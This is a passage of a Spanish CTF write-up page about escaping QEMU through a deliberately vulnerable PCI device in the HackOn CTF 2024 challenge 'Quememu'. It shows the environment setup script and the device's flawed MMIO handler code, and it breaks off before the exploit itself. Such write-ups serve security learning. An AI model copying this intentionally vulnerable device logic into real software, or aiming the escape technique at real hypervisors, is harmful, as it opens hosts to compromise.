@@ -1,0 +1,831 @@
+<!doctype html><html lang="es"><head><title>Quememu | 7Rocky</title>
+<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="HackOn CTF 2024. Dispositivo PCI. MMIO. `qemu` _escape_. Lectura y escritura OOB. `mprotect` y _shellcode_"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HackOn CTF 2024. Dispositivo PCI. MMIO. `qemu` _escape_. Lectura y escritura OOB. `mprotect` y _shellcode_"><meta itemprop="keywords" content><meta itemprop="name" content="Quememu"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="HackOn CTF 2024. Dispositivo PCI. MMIO. `qemu` _escape_. Lectura y escritura OOB. `mprotect` y _shellcode_"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Quememu"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/other/hackon-ctf/quememu/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="HackOn CTF 2024. Dispositivo PCI. MMIO. `qemu` _escape_. Lectura y escritura OOB. `mprotect` y _shellcode_"><meta name="twitter:description" content="HackOn CTF 2024. Dispositivo PCI. MMIO. `qemu` _escape_. Lectura y escritura OOB. `mprotect` y _shellcode_"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Quememu"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/other/hackon-ctf/quememu/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><script>MathJax={loader:{load:["[tex]/noerrors"]},options:{ignoreHtmlClass:"tex2jax_ignore",processHtmlClass:"tex2jax_process",skipHtmlTags:["noscript","pre","script","style","textarea"]},tex:{autoload:{color:[],colorv2:["color"]},displayMath:[["$$","$$"]],inlineMath:[["$","$"]],packages:{"[+]":["noerrors"]},processEnvironments:!0,processEscapes:!0}}</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script><div id="math-consts" style="display:none">$
+\newcommand{\e}{e}
+\newcommand{\N}[1][]{\mathbb{N}^{#1}}
+\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
+\newcommand{\R}[1][]{\mathbb{R}^{#1}}
+\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
+\newcommand{\C}[1][]{\mathbb{C}^{#1}}
+\newcommand{\dx}{\,\mathrm{d}x}
+\newcommand{\dy}{\,\mathrm{d}y}
+\newcommand{\dz}{\,\mathrm{d}z}
+\newcommand{\dt}{\,\mathrm{d}t}
+\newcommand{\divides}{\, | \,}
+\newcommand{\st}{\; | \;}
+\renewcommand{\geq}{\geqslant}
+\renewcommand{\leq}{\leqslant}
+\renewcommand{\i}{\mathrm{i}}
+\newcommand{\rank}{\mathop{\mathrm{rank}}}
+\newcommand{\gcd}{\mathop{\mathrm{gcd}}}
+\newcommand{\tr}{\mathop{\mathrm{tr}}}
+\newcommand{\charField}{\mathop{\mathrm{char}}}
+\newcommand{\Image}{\mathop{\mathrm{Im}}}
+$</div><script src="/js/imc.js"></script><script>(async()=>await typeset(()=>[`#math-consts`]))()</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HACKON CTF</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/other/hackon-ctf/quememu/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/other/hackon-ctf/quememu/&amp;text=Quememu" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/other/hackon-ctf/quememu/&amp;title=Quememu" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Quememu</h1><p class="mb4 f6 dib tracked">24 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#configuración-del-entorno">Configuración del entorno</a></li><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a><ul><li><a href="#vulnerabilidad">Vulnerabilidad</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a><ul><li><a href="#aclaraciones">Aclaraciones</a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#interacción-con-el-dispositivo-pci">Interacción con el dispositivo PCI</a></li><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li><li><a href="#ejecución-de-código-arbitrario">Ejecución de código arbitrario</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>En este reto nos dan un dispositivo PCI (<em>Peripheral Component Interconnect</em>) que se comunica mediante MMIO (<em>Memory-mapped I/O</em>). Este dispositivo se ha añadido al código base de <code>qemu</code> y nos dan el binario compilado y un archivo <code>diff.txt</code> con las diferencias añadidas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">ls</span> -l
+total 90964
+-rw-rw-r--  1 root root      718 Feb 13 21:42 Dockerfile
+-rwxrwxr-x  1 root root       59 Feb 13 21:42 <span class="code-green">deploy_docker.sh</span>
+-rw-rw-r--  1 root root     5494 Feb 13 21:41 diff.txt
+-rw-rw-r--  1 root root      151 Feb 13 21:42 docker-compose.yml
+-rw-rw-r--  1 root root       26 Feb 13 21:42 flag
+-rw-r--r--  1 root root  1320526 Feb 13 21:43 <span class="code-red">initramfs.cpio.gz</span>
+drwxrwxr-x  7 root root     4096 Feb 13 21:43 <span class="code-blue">pc-bios</span>
+-rwxrwxr-x  1 root root 76179320 Feb 13 21:43 <span class="code-green">qemu-system-x86_64</span>
+-rwxrwxr-x  1 root root      331 Feb 13 21:43 <span class="code-green">run.sh</span>
+-rw-------  1 root root 11614792 Feb 13 21:42 vmlinuz-5.15.0-92-generic  
+-rw-rw-r--  1 root root      176 Feb 13 21:42 xinetd
+</code></pre></div><p>En las diferencias, podemos ver el archivo <code>quememu.c</code>, que representa el código fuente del dispositivo vulnerable. En este reto tenemos que explotar el dispositivo PCI vulnerable para escapar de <code>qemu</code>.</p><h2 id="configuración-del-entorno">Configuración del entorno</h2><p>La configuración del entorno es similar a los retos de explotación de kernel, ya que tenemos que compilar un <em>exploit</em> en C y meterlo en <code>initramfs</code>. Este directorio se comprime y se pasa a <code>qemu</code>.</p><p>Para poder trabajar más cómodamente, podemos usar un <em>script</em> <code>go.sh</code> como el siguiente para compilar, comprimir y lanzar <code>qemu</code> de una vez:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env bash</span>
+
+<span class="mtk8">musl-gcc</span><span class="mtk1"> </span><span class="mtk6">-s</span><span class="mtk1"> </span><span class="mtk6">-static</span><span class="mtk1"> </span><span class="mtk6">-o</span><span class="mtk1"> </span><span class="mtk4">exploit</span><span class="mtk1"> </span><span class="mtk9 mtki">$1</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk7">exit</span>
+<span class="mtk8">mv</span><span class="mtk1"> </span><span class="mtk4">exploit</span><span class="mtk1"> </span><span class="mtk4">initramfs/</span>
+<span class="mtk7">cd</span><span class="mtk1"> </span><span class="mtk4">initramfs</span>
+<span class="mtk8">find</span><span class="mtk1"> </span><span class="mtk4">.</span><span class="mtk1"> </span><span class="mtk6">-print0</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">cpio</span><span class="mtk1"> </span><span class="mtk6">--null</span><span class="mtk1"> </span><span class="mtk6">-ov</span><span class="mtk1"> </span><span class="mtk6">--format=newc</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">gzip</span><span class="mtk1"> </span><span class="mtk6">-9</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk4">initramfs.cpio.gz</span>  
+<span class="mtk8">mv</span><span class="mtk1"> </span><span class="mtk4">initramfs.cpio.gz</span><span class="mtk1"> </span><span class="mtk4">..</span>
+<span class="mtk7">cd</span><span class="mtk1"> </span><span class="mtk4">..</span>
+
+<span class="mtk8">sh</span><span class="mtk1"> </span><span class="mtk4">run.sh</span>
+</code></pre></div><p>El <em>exploit</em> lo compilamos estáticamente con <code>musl-gcc</code> porque genera compilados más pequeños y sin depender de librerías externas. Para esto es necesario instalarlo con <code>apt install musl-tools</code>.</p><p>En el <em>script</em> de <code>qemu</code> (<code>run.sh</code>) es necesario modificar las rutas a los archivos <code>vmlinuz</code>, <code>initramfs.cpio.gz</code> y <code>pc-bios</code>. Y es posible que aparezca un error al ejecutarlo relacionado con la versión de la librería <code>SLIRP 4.7</code>. Si aparece esto, la mejor opción es traer la librería del contenedor de Docker que viene con el reto (usando <code>docker cp</code>, por ejemplo):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">docker cp &lt;container-id&gt;:/usr/lib/x86_64-linux-gnu/libslirp.so.0.4.0 .  
+</code></pre></div><h2 id="análisis-del-código-fuente">Análisis del código fuente</h2><p>El dispositivo <code>quememu</code> utiliza la siguiente estructura:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> {</span>
+<span class="mtk1">  PCIDevice </span><span class="mtk1">pdev</span><span class="mtk1">;</span>
+<span class="mtk1">  MemoryRegion </span><span class="mtk1">mmio</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">buff</span><span class="mtk1">[</span><span class="mtk8">BUFF_SIZE</span><span class="mtk1">];</span>  
+<span class="mtk1">  </span><span class="mtk7 mtki">struct</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">base_t</span><span class="mtk1"> </span><span class="mtk1">base</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">short</span><span class="mtk1"> </span><span class="mtk1">off</span><span class="mtk1">;</span>
+<span class="mtk1">    hwaddr </span><span class="mtk1">src</span><span class="mtk1">; </span>
+<span class="mtk1">  } </span><span class="mtk1">state</span><span class="mtk1">;</span>
+<span class="mtk1">} </span><span class="mtk8 mtku">QueMemuState</span><span class="mtk1">;</span>
+</code></pre></div><p>Y nos permite leer y escribir valores de esta estructura (<code>buff</code>, <code>base</code>, <code>off</code>, <code>src</code>) mediante las siguientes funciones:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">uint64_t</span><span class="mtk1"> </span><span class="mtk8">quememu_mmio_read</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">opaque</span><span class="mtk1">, hwaddr </span><span class="mtk9 mtki">addr</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk9 mtki">size</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">QueMemuState</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">quememu</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk8 mtku">QueMemuState</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk9 mtki">opaque</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">uint64_t</span><span class="mtk1"> </span><span class="mtk1">val</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">    </span><span class="mtk5">switch</span><span class="mtk1"> (</span><span class="mtk9 mtki">addr</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">00</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">trigger_rw</span><span class="mtk1">(</span><span class="mtk1">quememu</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">04</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk1">val</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">base</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">08</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk1">val</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">off</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">0c</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk1">val</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">src</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">default</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk1">val</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">FABADA</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">val</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">quememu_mmio_write</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">opaque</span><span class="mtk1">, hwaddr </span><span class="mtk9 mtki">addr</span><span class="mtk1">, </span><span class="mtk7 mtki">uint64_t</span><span class="mtk1"> </span><span class="mtk9 mtki">val</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk9 mtki">size</span><span class="mtk1">) {</span>  
+<span class="mtk1">    </span><span class="mtk8 mtku">QueMemuState</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">quememu</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk8 mtku">QueMemuState</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk9 mtki">opaque</span><span class="mtk1">;</span>
+
+<span class="mtk1">    </span><span class="mtk5">switch</span><span class="mtk1"> (</span><span class="mtk9 mtki">addr</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">00</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">trigger_rw</span><span class="mtk1">(</span><span class="mtk1">quememu</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">04</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk8 mtku">base_t</span><span class="mtk1">) </span><span class="mtk9 mtki">val</span><span class="mtk1"> </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk8">MAX_BASE</span><span class="mtk1">) </span><span class="mtk1">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">base</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">val</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">08</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk7 mtki">short</span><span class="mtk1">) </span><span class="mtk9 mtki">val</span><span class="mtk1"> </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk1">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">off</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">val</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">0c</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk1">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">src</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">val</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">default</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>La función <code>trigger_rw</code> es la que realmente lee o escribe en la memoria del dispositivo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">trigger_rw</span><span class="mtk1">(</span><span class="mtk8 mtku">QueMemuState</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">quememu</span><span class="mtk1">, </span><span class="mtk7 mtki">bool</span><span class="mtk1"> </span><span class="mtk9 mtki">is_write</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">base</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk3">// Don't change base cause we already use base 16</span>
